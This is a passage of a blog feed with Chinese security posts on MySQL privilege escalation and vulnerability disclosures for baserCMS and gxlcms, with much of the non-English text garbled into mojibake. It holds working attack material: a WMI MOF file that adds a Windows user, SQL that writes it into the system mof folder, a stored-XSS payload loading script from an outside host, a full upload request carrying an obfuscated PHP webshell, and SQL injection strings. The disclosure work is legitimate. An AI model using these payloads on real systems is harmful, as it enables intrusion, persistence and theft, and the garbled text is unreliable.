class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</div><div class="line"> </div><div class="line">instance of __EventFilter as $EventFilter</div><div class="line">&#123;</div><div class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</div><div class="line">    Name  = &quot;filtP2&quot;;</div><div class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</div><div class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</div><div class="line">            &quot;And TargetInstance.Second = 5&quot;;</div><div class="line">    QueryLanguage = &quot;WQL&quot;;</div><div class="line">&#125;;</div><div class="line"> </div><div class="line">instance of ActiveScriptEventConsumer as $Consumer</div><div class="line">&#123;</div><div class="line">    Name = &quot;consPCSV2&quot;;</div><div class="line">    ScriptingEngine = &quot;JScript&quot;;</div><div class="line">    ScriptText =</div><div class="line">    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user xxx xxx /add\&quot;)&quot;;</div><div class="line">&#125;;</div><div class="line"> </div><div class="line">instance of __FilterToConsumerBinding</div><div class="line">&#123;</div><div class="line">    Consumer   = $Consumer;</div><div class="line">    Filter = $EventFilter;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>æ‰§è¡Œsqlå‘½ä»¤ï¼š<br><code>select load file(&#39;c:/wmpub/nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mov&#39;</code>;</p><p>åœ¨å¯æ§æ•°æ®åº“çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥ç›´æ¥å†™å…¥ï¼š<br><code>select char(å°†ä¸Šè¿°exp ascç¼–ç å†™å…¥) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mov&#39;;</code></p><p>ä»¥ä¸Šå‡ä¸ºæ–°å»ºè´¦å·ï¼Œè¿˜éœ€è¦ä¿®æ”¹ä»£ç å°†xxxç”¨æˆ·åŠ å…¥administratorsï¼Œé‡æ–°å†™å…¥ä¸€éå³å¯ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;udfææƒ&quot;&gt;&lt;a href=&quot;#udfææƒ&quot; class=&quot;headerlink&quot; title=&quot;udfææƒ&quot;&gt;&lt;/a&gt;udfææƒ&lt;/h3&gt;&lt;p&gt;æ¡ä»¶ï¼š&lt;br&gt;1ã€ç³»ç»Ÿç‰ˆæœ¬ï¼ˆWindows2000ï¼ŒXP,Win2003);&lt;br&gt;2ã€æ‹¥æœ‰MYSQLçš„æŸä¸ªè´¦å·ï¼Œä¸”è¯¥è´¦å·å…·æœ‰å¯¹msqlçš„insertä¸deleteæƒé™ã€‚&lt;br&gt;3ã€å…·æœ‰rootè´¦å·å¯†ç 
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="ææƒ" scheme="http://sunu11.com/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="mysql" scheme="http://sunu11.com/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>baserCMS æ¼æ´æŠ«æ¼</title>
    <link href="http://sunu11.com/2018/10/31/baserCMS/"/>
    <id>http://sunu11.com/2018/10/31/baserCMS/</id>
    <published>2018-10-31T09:07:23.000Z</published>
    <updated>2018-11-28T04:58:17.163Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>baserCMSï¼ˆãƒ™ãƒ¼ã‚µãƒ¼ã‚·ãƒ¼ã‚¨ãƒ ã‚¨ã‚¹ï¼‰ã¨ã¯ã€ç›´æ„Ÿçš„ãªæ“ä½œã¨é«˜ã„ãƒ¡ãƒ³ãƒ†ãƒŠãƒ³ã‚¹æ€§ã‚’å®Ÿç¾ã—ã€Webã‚µã‚¤ãƒˆã‚’è‡ªç”±ã«ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã§ãã‚‹å›½ç”£CMSï¼ˆã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ»ãƒãƒãƒ¼ã‚¸ãƒ¡ãƒ³ãƒˆãƒ»ã‚·ã‚¹ãƒ†ãƒ ï¼‰ã§ã™ã€‚æ—¥æœ¬äººãŒæ—¥æœ¬äººã®ç‚ºã«ã€ã¿ã‚“ãªã§ä½œã£ã¦ã„ã‚‹ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ãƒ»ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã§ã™ã€‚ç„¡æ–™ã§åˆ©ç”¨ã§ãã€æ§˜ã€…ãªã‚µãƒ¼ãƒãƒ¼ã§å‹•ä½œå¯èƒ½ã§ã€ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã‚‚ç°¡å˜ã§ã™ã€‚<a id="more"></a></p><p>ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ãƒ»ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã€ŒCakePHPã€ã‚’ãƒ™ãƒ¼ã‚¹ã¨ã—ã¦ã„ã‚‹ã®ã§ã€ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºæ€§ã€ãƒ¡ãƒ³ãƒ†ãƒŠãƒ³ã‚¹æ€§ãŒé«˜ã„ã®ãŒç‰¹å¾´ã§ã™ã€‚</p><p>ãƒ„ãƒªãƒ¼æ§‹é€ ã«ã‚ˆã‚Šå›ºå®šãƒšãƒ¼ã‚¸ã€ãƒ–ãƒ­ã‚°ã€ãƒ•ã‚©ãƒ¼ãƒ ã‚’ã¾ã¨ã‚ã¦ç®¡ç†ã§ãã‚‹ã€å¼·åŠ›ãªã‚³ãƒ³ãƒ†ãƒ³ãƒ„ç®¡ç†æ©Ÿèƒ½ã‚’æŒã¤CMSã§ã™ã€‚Webã‚µã‚¤ãƒˆã«æœ€ä½é™å¿…è¦ã¨ãªã‚‹ãƒ¡ãƒ¼ãƒ«ãƒ•ã‚©ãƒ¼ãƒ ã‚„æ–°ç€ãƒ–ãƒ­ã‚°ãªã©ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚„ç®¡ç†ç”»é¢ã®æ çµ„ã¿ã‚’æœ€åˆã‹ã‚‰è£…å‚™ã—ã¦ãŠã‚Šã€ã‚¹ãƒãƒ¼ãƒˆãƒ•ã‚©ãƒ³ã«ã‚‚æ¨™æº–å¯¾å¿œã—ã¦ã„ã¾ã™ã€‚</p><p>ãƒãƒ‹ãƒ¥ã‚¢ãƒ«ã‚„ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®ã‚³ãƒ¡ãƒ³ãƒˆã«ãŠã„ã¦æ—¥æœ¬èªã‚’æ¨™æº–ã¨ã—ã¦ã„ã‚‹ã®ã‚‚å›½ç”£CMSã®å¼·ã¿ã§ã™ã€‚  â€”â€”â€”â€” itâ€™s copy from <a href="https://basercms.net/about/index.html" target="_blank" rel="external">https://basercms.net/about/index.html</a></p><p>I found two vulnerability in basicCMS 4.1.3.</p><h3 id="storage-xss-vulnerabilityï¼ˆfixedï¼‰"><a href="#storage-xss-vulnerabilityï¼ˆfixedï¼‰" class="headerlink" title="storage xss vulnerabilityï¼ˆfixedï¼‰"></a>storage xss vulnerabilityï¼ˆfixedï¼‰</h3><p>There is a storage xss vulnerability in the category name editor after login with normal administrator privileges.</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>We register two administrator accounts with different permissionsï¼šã‚·ã‚¹ãƒ†ãƒ ç®¡ç† and ã‚µã‚¤ãƒˆé‹å–¶<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-1.png" alt="å›¾1"><br>Log in to the system using ã‚µã‚¤ãƒˆé‹å–¶ privileged account root:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-2.png" alt="å›¾2"><br>In the Register New Category feature of the Upload menu, the category name can execute a malicious xss statement:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-3.png" alt="å›¾3"><br>After the administrator logs in, accessing the page triggers:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-4.png" alt="å›¾4"><br>Soï¼ŒWe can insert malicious javascript according to the vulnerability to override the administrator function.<br>For example<br>The root user does not have permission to access<br>â€œ<a href="http://127.0.0.1/basercms/admin/site_configs/del_cacheâ€" target="_blank" rel="external">http://127.0.0.1/basercms/admin/site_configs/del_cacheâ€</a> to delete the server cache information:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-5.png" alt="å›¾5"><br>We can exploit this vulnerability to implement an attack:<br>Since the <strong><code>data[UploaderCategory][name]</code></strong> parameter has a length limit, We can insert the following statement first:<br><code>&lt;script src=&quot;http://vps_ip/1.js&quot;&gt;&lt;/script&gt;</code><br>Then, 1.js uses ajax to write a get request to<br><code>http://127.0.0.1/basercms/admin/site_configs/del_cache</code>:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-6.png" alt="å›¾6"><br>Verify: The root (asda)user refreshes the page:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-7.png" alt="å›¾7"><br>And when the administrator user(ad_lab) accesses the page, it triggers js and deletes the server cache.<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-8.png" alt="å›¾8"><br>Finally, I found the corresponding code with defects.<br>UploaderCategoriesController.php<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-9.png" alt="å›¾9"><br>It was found that the ã‚«ãƒ†ã‚´ãƒªåï¼ˆ<strong><code>data[UploaderCategory][name]</code></strong>ï¼‰parameter submitted by the user did not filter the malicious characters,</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h4><p>Note: The issue has been reported in 2018 09 and was resolved by a developer of baserCMS. <a href="https://basercms.net/news/archives/574" target="_blank" rel="external">Announcement address</a></p><h3 id="Code-Execution-Vulnerabilityï¼ˆfixedï¼‰"><a href="#Code-Execution-Vulnerabilityï¼ˆfixedï¼‰" class="headerlink" title="Code Execution Vulnerabilityï¼ˆfixedï¼‰"></a>Code Execution Vulnerabilityï¼ˆfixedï¼‰</h3><h4 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h4><p>Download the latest version of basercms (4.1.3).In \basercms\lib\Baser\Model\ThemeConfig.php, you can see that the uploaded file suffix is not checked, so we can upload the webshell file directly.</p><p>In the saveImage method of \basercms\lib\Baser\Model\ThemeConfig.php we can see that is about saving the logo during the theme setup:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-10.png" alt="å›¾10"><br>We can seen move_uploaded_file methodï¼ŒThen audit codeï¼ŒIt can be seen that the image is saved here and the suffix is not verified.ï¼ŒOnly limited the image name (logo)ï¼ŒSo you can get server permissions by uploading php webshell.<br>Pocï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">POST /basercms/admin/theme_configs/form HTTP/1.1</div><div class="line">Host: 127.0.0.1</div><div class="line">Content-Length: 3986</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://127.0.0.1</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</div><div class="line">Referer: http://127.0.0.1/basercms/admin/theme_configs/form</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</div><div class="line">Cookie: BASERCMS=vfshte61c73tufbvit1j63amv2</div><div class="line">Connection: close</div><div class="line"></div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;_method&quot;</div><div class="line"></div><div class="line">POST</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[_Token][key]&quot;</div><div class="line"></div><div class="line">65d6c82611c9eb9840aef42c97d82c36847093f574cbe4c2cb7964537a3d594b19d92b9c116bd3595e0f14ba510a880e1a2573033f81a71dd25800d09917183a</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_main]&quot;</div><div class="line"></div><div class="line">e371e3</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_sub]&quot;</div><div class="line"></div><div class="line">21b537</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_link]&quot;</div><div class="line"></div><div class="line">1808f5</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_hover]&quot;</div><div class="line"></div><div class="line">ed8815</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo]&quot;; filename=&quot;x.php&quot;</div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_GET[cc]);  ?&gt;</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo_alt]&quot;</div><div class="line"></div><div class="line">baserCMS</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo_link]&quot;</div><div class="line">...</div></pre></td></tr></table></figure></p><p>Then according to the code description, you can get the webshell path:<br><a href="http://127.0.0.1/basercms/files/theme_configs/logo.php" target="_blank" rel="external">http://127.0.0.1/basercms/files/theme_configs/logo.php</a><br>Command execution:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-11.png" alt="å›¾11"></p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution:"></a>Solution:</h4><p>Whitelist restrictions on upload file suffixes such as (jpg, png, gif, jpeg etc.)<br>Note: The issue has been reported in 2018 09 and was resolved by a developer of baserCMS. <a href="https://basercms.net/news/archives/574" target="_blank" rel="external">Announcement address</a></p><h3 id="Vulnerability-information-page"><a href="#Vulnerability-information-page" class="headerlink" title="Vulnerability information page:"></a>Vulnerability information page:</h3><p><a href="https://basercms.net/security/CVE-2018-18942_CVE-2018-18943" target="_blank" rel="external">https://basercms.net/security/CVE-2018-18942_CVE-2018-18943</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h3&gt;&lt;p&gt;baserCMSï¼ˆãƒ™ãƒ¼ã‚µãƒ¼ã‚·ãƒ¼ã‚¨ãƒ ã‚¨ã‚¹ï¼‰ã¨ã¯ã€ç›´æ„Ÿçš„ãªæ“ä½œã¨é«˜ã„ãƒ¡ãƒ³ãƒ†ãƒŠãƒ³ã‚¹æ€§ã‚’å®Ÿç¾ã—ã€Webã‚µã‚¤ãƒˆã‚’è‡ªç”±ã«ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã§ãã‚‹å›½ç”£CMSï¼ˆã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ»ãƒãƒãƒ¼ã‚¸ãƒ¡ãƒ³ãƒˆãƒ»ã‚·ã‚¹ãƒ†ãƒ ï¼‰ã§ã™ã€‚æ—¥æœ¬äººãŒæ—¥æœ¬äººã®ç‚ºã«ã€ã¿ã‚“ãªã§ä½œã£ã¦ã„ã‚‹ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ãƒ»ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã§ã™ã€‚ç„¡æ–™ã§åˆ©ç”¨ã§ãã€æ§˜ã€…ãªã‚µãƒ¼ãƒãƒ¼ã§å‹•ä½œå¯èƒ½ã§ã€ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã‚‚ç°¡å˜ã§ã™ã€‚
    
    </summary>
    
      <category term="WEBå®‰å…¨" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="baserCMS" scheme="http://sunu11.com/tags/baserCMS/"/>
    
      <category term="æ¼æ´æŠ«æ¼" scheme="http://sunu11.com/tags/%E6%BC%8F%E6%B4%9E%E6%8A%AB%E6%BC%8F/"/>
    
      <category term="ä»£ç å®¡è®¡" scheme="http://sunu11.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>glxcmsæ¼æ´æŠ«æ¼</title>
    <link href="http://sunu11.com/2018/10/18/glxcms/"/>
    <id>http://sunu11.com/2018/10/18/glxcms/</id>
    <published>2018-10-18T09:56:39.000Z</published>
    <updated>2018-11-03T12:01:48.674Z</updated>
    
    <content type="html"><![CDATA[<h3 id="cmsç®€ä»‹"><a href="#cmsç®€ä»‹" class="headerlink" title="cmsç®€ä»‹"></a>cmsç®€ä»‹</h3><p>Gxlcmsæ–°é—»ç³»ç»Ÿæ˜¯ä¸€ä¸ªä»¥php+mysqlè¿›è¡Œå¼€å‘çš„æ–°é—»ç±»cmså†…å®¹ç®¡ç†ç³»ç»Ÿã€‚<br>Gxlcmsæ–°é—»ç³»ç»Ÿçš„ä¼˜åŠ¿ï¼šå‰å°ä¸åå°é‡‡ç”¨éš”ç¦»æ–¹å¼ï¼Œæ¨¡æ¿åŒ–è®¾è®¡ï¼Œ<a id="more"></a>è®©åªè¦ä½ ä¼šå‰ç«¯å°±å¯ä»¥åšä¸€ä¸ªæ–°é—»ç½‘ç«™ï¼åå°è®¾è®¡ç®€å•æ˜äº†ï¼Œå°ç™½ç”¨æˆ·ä¸€çœ‹å°±ä¼šæ˜ç™½ï¼ç¨‹åºåŠŸèƒ½ä¹Ÿéå¸¸å®Œå–„ï¼<br>1.ç›®å‰ç¨‹åºæ”¯æŒä¸‰ç§è·¯ç”±æ¨¡å¼ï¼šé™æ€ç”Ÿæˆï¼Œä¼ªé™æ€ï¼ŒåŠ¨æ€ï¼›<br>2.æ”¯æŒä¸¤ç§å­˜å‚¨æ¨¡å¼ï¼šæœ¬åœ°å­˜å‚¨ï¼ŒFTPå­˜å‚¨<br>3.æ¥å…¥ç™¾åº¦ä¸»åŠ¨æ¨é€åŠŸèƒ½ï¼è®©ä½ æ¯ç¯‡æ–°é—»/èµ„è®¯éƒ½å¯ä»¥åŠæ—¶è¢«ç™¾åº¦å‘ç°<br>4.å›¾ç‰‡æ°´å°åŠŸèƒ½ï¼šåªè¦å¼€å¯å›¾ç‰‡æ°´å°ï¼Œä¸ç®¡æ˜¯æ ‡å›¾å›¾ç‰‡æˆ–è€…æ˜¯å†…å®¹å›¾ç‰‡ç»Ÿç»Ÿæ·»åŠ æ°´å°ï¼Œæ°´å°åŠŸèƒ½æ”¯æŒ9å®«æ ¼è®¾è®¡ï¼Œè®©ä½ å¯ä»¥éšæ„æŠŠå›¾ç‰‡æ°´å°åŠ åˆ°ä»»æ„åœ°æ–¹<br>5.æ•°æ®åº“ä¸€é”®å¤‡ä»½/è¿˜åŸï¼Œè®©ä½ å¯ä»¥è½»æ¾çš„æŠŠç½‘ç«™è¿ç§»åˆ°ä»»ä½•æœåŠ¡å™¨ä¸Š<br>6.ç¼“å­˜åŠŸèƒ½ï¼šæ¨¡æ¿ç¼“å­˜ï¼Œæ•°æ®åº“ç¼“å­˜ï¼Œç½‘ç«™é¡µé¢ç¼“å­˜<br>7.å‹æƒ…é“¾æ¥ï¼šæ”¯æŒå›¾ç‰‡é“¾æ¥å’Œæ–‡å­—é“¾æ¥<br>8.å¹¿å‘Šæ¨¡å—ï¼šåªè¦åå°æ·»åŠ å¹¿å‘Šåï¼Œå…¨éƒ¨jsç”Ÿæˆåˆ°å‰å°ï¼Œè®©ä½ ä¸ç”¨è´¹äº‹ä¿®æ”¹æ¨¡æ¿<br>9.é‡‡é›†åŠŸèƒ½ï¼Œæˆ‘ä»¬æ”¯æŒç«è½¦å¤´é‡‡é›†ï¼Œç«è½¦å¤´æ¥å£å·²ç»åœ¨æ’ä»¶ä¸­å¿ƒé‡Œé¢ï¼Œåªéœ€è¦ä½ ä¸‹è½½åï¼Œå°±å¯ä»¥é‡‡é›†ä¸Šä¸‡æ–°é—»å†…å®¹ï¼Œä¸ºäº†é˜²æ­¢é‡åæ–°é—»ï¼Œæˆ‘ä»¬å¯¹æ¥å£åšäº†ç»†è…»åŒ–çš„åŠŸèƒ½ï¼Œæ”¯æŒå…¥åº“é‡ååˆ¤æ–­ï¼Œå½“æœ‰é‡åæ–°é—»è‡ªåŠ¨è¿‡æ»¤<br>10.æ‰©å±•åŠŸèƒ½ï¼šæ‰©å±•æ€§ï¼Œå¯ä»¥åœ¨æ’ä»¶ä¸­å¿ƒä¸‹è½½ï¼Œæ‹›è˜æ¨¡å—ï¼Œå›¾é›†æ¨¡å—ï¼Œä¼šå‘˜ä¸­å¿ƒæ¨¡å—ï¼Œäº¤å‹æ¨¡å—ç­‰ç­‰æ¨¡å—è¿›è¡Œå®‰è£…ï¼ˆå¼€å‘ä¸­ï¼‰<br><a href="https://gitee.com/gxlcms/Gxlcmsv2.0-20180915" target="_blank" rel="external">æºç ä¸‹è½½åœ°å€:</a><br><a href="http://news.gxlcms.com/" target="_blank" rel="external">Demoåœ°å€ï¼š</a><br>å®˜ç½‘æ›´æ–°è¡¥ä¸é“¾æ¥ï¼šå¾…è¡¥å……</p><h3 id="æ¼æ´è¯¦æƒ…ï¼š"><a href="#æ¼æ´è¯¦æƒ…ï¼š" class="headerlink" title="æ¼æ´è¯¦æƒ…ï¼š"></a>æ¼æ´è¯¦æƒ…ï¼š</h3><h4 id="1ã€åå°sqlæ³¨å…¥æ¼æ´-CVE-2018-18488"><a href="#1ã€åå°sqlæ³¨å…¥æ¼æ´-CVE-2018-18488" class="headerlink" title="1ã€åå°sqlæ³¨å…¥æ¼æ´(CVE-2018-18488)"></a>1ã€åå°sqlæ³¨å…¥æ¼æ´(CVE-2018-18488)</h4><h5 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h5><p>ä»\lib\admin\action\dataaction.class.phpæ–‡ä»¶ä¸­å¤„ç†æ•°æ®åº“å¤‡ä»½æ–¹æ³•å¯çŸ¥ï¼š<br>$tableæ˜¯ä»$_POST[â€˜idsâ€™]ä¸­ä¼ å…¥ï¼Œä¸”å¯æ§ã€‚ç„¶åï¼Œåœ¨32è¡Œä»£ç ä¸­ä¸TRUNCATE TABLE æ‹¼æ¥å­˜å…¥sqlæ–‡ä»¶ï¼Œç„¶ååœ¨åç»­å¯¼å…¥è¿˜åŸåŠŸèƒ½ä¸­æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ§åˆ¶ç”Ÿæˆçš„sqlæ–‡ä»¶ï¼Œå¹¶ä¸”æ‰§è¡Œä»»æ„sqlè¯­å¥ã€‚<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-1.png" alt="å›¾1"><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-2.png" alt="å›¾2"><br>æ„é€ sqlæ³¨å…¥è¯­å¥ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ids%5B%5D=gxl_actor`;</div><div class="line">select sleep(3);--%20</div></pre></td></tr></table></figure></p><p>æˆ‘ä»¬å‘é€æ•°æ®åŒ…åï¼Œç”Ÿæˆçš„sqlæ–‡ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼š<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-3.png" alt="å›¾3"><br>ç„¶ååœ¨è¿›è¡Œå¤‡ä»½è¿˜åŸï¼š<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-4.png" alt="å›¾4"><br>å¯çœ‹åˆ°å»¶è¿Ÿï¼Œæˆ‘ä»¬æ³¨å…¥select sleep(1)åé€šè¿‡sqlå¤‡ä»½è¿˜åŸåŠŸèƒ½æ‰§è¡Œsqlæ–‡ä»¶ï¼š<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-5.png" alt="å›¾5"><br>å› æ­¤åˆ¤æ–­å­˜åœ¨æ³¨å…¥ã€‚</p><h5 id="ä¿®å¤å»ºè®®ï¼š"><a href="#ä¿®å¤å»ºè®®ï¼š" class="headerlink" title="ä¿®å¤å»ºè®®ï¼š"></a>ä¿®å¤å»ºè®®ï¼š</h5><p>å¯¹idså‚æ•°å€¼è¿›è¡Œè¿‡æ»¤</p><h4 id="2ã€å‰å°ä»»æ„sqlå¤‡ä»½æ–‡ä»¶ä¸‹è½½ï¼š-CVE-2018-18487"><a href="#2ã€å‰å°ä»»æ„sqlå¤‡ä»½æ–‡ä»¶ä¸‹è½½ï¼š-CVE-2018-18487" class="headerlink" title="2ã€å‰å°ä»»æ„sqlå¤‡ä»½æ–‡ä»¶ä¸‹è½½ï¼š(CVE-2018-18487)"></a>2ã€å‰å°ä»»æ„sqlå¤‡ä»½æ–‡ä»¶ä¸‹è½½ï¼š(CVE-2018-18487)</h4><h5 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h5><p>ä»\lib\admin\action\dataaction.class.phpæ–‡ä»¶ä¸­å¤„ç†æ•°æ®åº“å¤‡ä»½æ–¹æ³•å¯çŸ¥ç”Ÿæˆå¤‡ä»½æ–‡ä»¶çš„æ–¹æ³•å¦‚ä¸‹ï¼š<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-6.png" alt="å›¾6"><br>çœ‹åˆ°<code>mt_rand</code>å‡½æ•°ï¼š<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-7.png" alt="phpå®˜ç½‘"><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-8.png" alt="å…ˆçŸ¥ç¤¾åŒº"></p><p>ç„¶åç»“åˆcmsçš„sqlæ–‡ä»¶ç”Ÿæˆä»£ç :<br><code>Sqlæ–‡ä»¶åå­—ï¼šå¹´æœˆæ—¥_éšæœºæ•°_1.sql</code></p><p>é€šè¿‡éšæœºæ•°å€¼æ¥çˆ†ç ´ç§å­çš„è¿‡ç¨‹ï¼Œå¤–å›½æœ‹å‹å†™äº†ä¸€ä¸ªå·¥å…·ï¼šphp_mt_seedï¼ˆå®˜æ–¹ä½¿ç”¨è¯´æ˜ï¼š<a href="http://www.openwall.com/php_mt_seed/README" target="_blank" rel="external">http://www.openwall.com/php_mt_seed/README</a> ï¼‰ã€‚ä½¿ç”¨å·¥å…·è·å¾—éšæœºæ•°ï¼Œæ‹¼æ¥sqlæ–‡ä»¶åç§°ã€‚<br>ç„¶ååœ¨ç®¡ç†å‘˜æœªä¿®æ”¹æºç ç›®å½•çš„æƒ…å†µä¸‹è®¿é—®é»˜è®¤è·¯å¾„å³å¯æœªæˆæƒä¸‹è½½å¤‡ä»½çš„sqlæ–‡ä»¶ï¼š<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-9.png" alt="å›¾9"></p><h5 id="ä¿®å¤å»ºè®®ï¼š-1"><a href="#ä¿®å¤å»ºè®®ï¼š-1" class="headerlink" title="ä¿®å¤å»ºè®®ï¼š"></a>ä¿®å¤å»ºè®®ï¼š</h5><p>å¯å‚è€ƒphpcmså°äºV9.6.2 authkeyæ³„éœ²çš„ä¿®å¤æ–¹å¼åœ¨æ¯æ¬¡ç”Ÿæˆéšæœºæ•°ä¹‹å‰éƒ½æ‰‹åŠ¨æ’­ç§ä¸€æ¬¡ï¼Œ<br>æˆ–è€…é‡‡ç”¨æ—¶é—´æˆ³çš„æ–¹å¼ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://xz.aliyun.com/t/31" target="_blank" rel="external">https://xz.aliyun.com/t/31</a></p>]]></content>
    
